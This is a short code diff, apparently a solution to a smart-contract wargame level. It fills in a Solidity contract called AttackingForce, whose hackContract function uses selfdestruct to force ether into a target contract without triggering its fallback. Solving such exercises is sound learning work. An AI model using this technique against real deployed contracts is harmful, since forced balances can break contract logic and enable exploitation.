@@ -8,8 +8,10 @@ contract AttackingForce {
     constructor(address _contractAddress) payable {
         contractAddress = _contractAddress;
     }
-
+    //send funds with payable to the address
+    //self destruct will allow us to send money without invoking fallback on another function
     function hackContract() external {
-        // Code me!
+        address payable addr = payable(address(contractAddress));
+        selfdestruct(addr);
     }
 }
